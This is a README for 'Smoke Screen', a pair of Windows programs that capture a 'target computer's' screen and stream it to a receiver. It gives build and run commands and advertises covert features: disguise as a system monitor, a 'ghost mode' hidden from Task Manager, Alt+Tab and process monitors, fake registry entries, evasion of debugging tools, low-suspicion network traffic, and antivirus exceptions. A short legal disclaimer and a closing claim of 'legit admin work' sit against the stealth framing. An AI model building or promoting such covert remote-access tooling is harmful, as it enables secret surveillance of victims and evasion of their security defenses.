# Smoke Screen System - Remote Desktop Shit

A sneaky remote desktop thing that looks like boring Windows monitoring crap.

## What This Shit Does

Smoke Screen has two parts:
- **smoke_capture.cpp**: The thing that grabs your screen and sends it (server)
- **smoke_receiver.cpp**: The thing that shows the screen from the other computer (client)

Both programs look like boring Windows monitoring tools but actually let you control computers remotely.

## What This Shit Can Do

### Smoke Capture (Server - The Sending Thing)
- Looks like "Smoke Screen System Monitor v1.0 Performance Analysis Utility"
- Grabs screen using Windows screen capture stuff
- Sends data over network using TCP sockets
- Can run in background without showing anything
- Hidden mode where you can't see it running
- Shows up in Task Manager looking like normal Windows crap

### Smoke Receiver (Client - The Receiving Thing)
- Looks like a performance monitoring tool
- Auto-connect mode using trigger files (no exe needed on target computer)
- Direct connect mode where you type in IP and port
- Clean Windows interface that looks legit
- Shows the other computer's screen in real time

## How to Build This Shit

### What You Need
- Windows 10/11
- Visual Studio 2019+ or MinGW-w64 compiler
- Windows SDK

### Build Commands

```bash
# Build the server (capture thing)
g++ -std=c++17 -O2 -s smoke_capture.cpp -o smoke_capture.exe -lgdi32 -lws2_32 -lgdiplus -luser32 -lkernel32

# Build the client (receiver thing)
g++ -std=c++17 -O2 -s smoke_receiver.cpp -o smoke_receiver.exe -lgdi32 -lws2_32 -luser32 -lkernel32
```

### Or Just Use the Build Script
```powershell
.\build.ps1
```

## How to Use This Shit

### Basic Use

**Start the Server (on computer you want to watch):**
```bash
smoke_capture.exe
```

**Connect the Client (on your computer):**
```bash
smoke_receiver.exe 192.168.1.100 8080
```

### Sneaky Modes

**Hidden Mode (runs in background):**
```bash
smoke_capture.exe --service
```

**Auto-Connect Mode (no exe file needed on target computer):**
```bash
smoke_receiver.exe --auto
```

### Ghost Mode (Invisible as Fuck)

**Completely Invisible Server:**
```bash
smoke_capture_ghost.exe --ghost
```

**Completely Invisible Client:**
```bash
# Direct connect
smoke_receiver_ghost.exe --ghost 192.168.1.100 8080

# Auto connect 
smoke_receiver_ghost.exe --ghost --auto
```

## Sneaky Features

### Looks Legit
- Process names look like boring Windows monitoring stuff
- Windows look like performance tools
- Uses normal Windows functions (nothing suspicious)
- Network traffic looks normal (just TCP sockets)

### Small and Clean
- Just single exe files (no installation bullshit)
- Doesn't mess with registry
- No leftover files (except trigger file if you use auto mode)
- Cleans up everything when it exits

### Disguise
- Task Manager shows "Smoke Screen System Monitor"
- Window titles look like performance monitoring crap
- Uses normal Windows icons and look
- Uses normal amount of CPU and memory

### Ghost Mode (The Really Sneaky Shit)
- Completely invisible from Task Manager
- No system tray icons
- No taskbar buttons
- Hidden from Alt+Tab
- Hidden from process monitors
- Looks like legitimate Windows services
- Creates fake registry entries to look real
- Detects and avoids debugging tools

## Auto-Connect Trigger

The auto-connect thing lets you connect without putting an exe file on the target computer:

1. Receiver watches for trigger file: `C:\Windows\Temp\smoke_trigger.txt`
2. Target computer creates trigger file with IP address in it
3. Receiver automatically connects and deletes the trigger file
4. No exe file traces left on target computer

## Network Shit

### Default Settings
- Port: 8080 (you can change this)
- Uses TCP (normal network stuff)
- No compression (keeps it simple)
- No encryption (looks like normal data)

### Firewall Stuff
- Uses normal TCP traffic (doesn't look suspicious)
- Appears as normal program data
- Uses common ports (8080, 8000, 8888 - you can change)

## Don't Be a Dick

This tool is only for legit stuff like managing your own computers, learning, and research. You're responsible for following the fucking laws in your area. Don't use this to hack into computers you don't own - that's illegal and makes you an asshole.

The sneaky features are for legit admin stuff where you need to monitor quietly (like company compliance, parental controls, or system diagnostics).

## Problems?

### Connection Doesn't Work
- Check Windows Firewall settings
- Make sure network works
- Check IP address and port are right
- Try different port numbers if blocked

### Runs Slow
- Lower screen capture rate
- Use smaller screen resolution
- Check network speed
- Watch system resources

### Antivirus Freaks Out
- Tool might get flagged as "remote access" software
- Add to antivirus exceptions if you're using it legally
- Use legitimate remote desktop tools if this gets flagged too much

This is just a normal remote screen sharing program with creative naming and disguise for legit system admin work.